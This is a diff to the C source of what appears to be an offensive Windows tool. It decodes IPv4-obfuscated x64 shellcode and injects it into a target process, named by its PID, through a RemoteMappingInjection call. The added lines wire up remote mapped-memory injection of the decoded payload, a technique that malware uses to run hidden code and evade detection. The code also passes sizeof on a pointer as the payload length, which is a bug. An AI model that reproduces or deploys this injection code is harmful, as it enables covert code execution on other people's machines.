@@ -47,14 +47,16 @@ const char* obfuscated_shellcode_x64[] = {
  * ENTRY POINT.
  */
 int main(int argc, char *argv[]){
+    DWORD PID      = 0;
+    PBYTE pPayload = NULL;
+
     if(argc != 2){
         printf("[!] ERROR : must pass <PID> in param... \n");
         return EXIT_FAILURE;
     }
 
-    DWORD PID = atoi(argv[1]);
-
-    PBYTE payload = Ipv4Deobfuscation(obfuscated_shellcode_x64, sizeof(obfuscated_shellcode_x64) / sizeof(obfuscated_shellcode_x64[0]));
+    PID = atoi(argv[1]);
+    pPayload = Ipv4Deobfuscation(obfuscated_shellcode_x64, sizeof(obfuscated_shellcode_x64) / sizeof(obfuscated_shellcode_x64[0]));
 
     // SHOW PAYLOAD (ORIGINAL)
     // if (payload != NULL) {
@@ -66,6 +68,11 @@ int main(int argc, char *argv[]){
     // }
     // -------------------------------------------------
 
-    free(payload);
+    if(!RemoteMappingInjection(PID, pPayload, sizeof(pPayload))){
+        printf("[!] Error executing mapexec with PID : %lu \n", PID);
+        return EXIT_FAILURE;
+    }
+
+    free(pPayload);
     return EXIT_SUCCESS;
 }
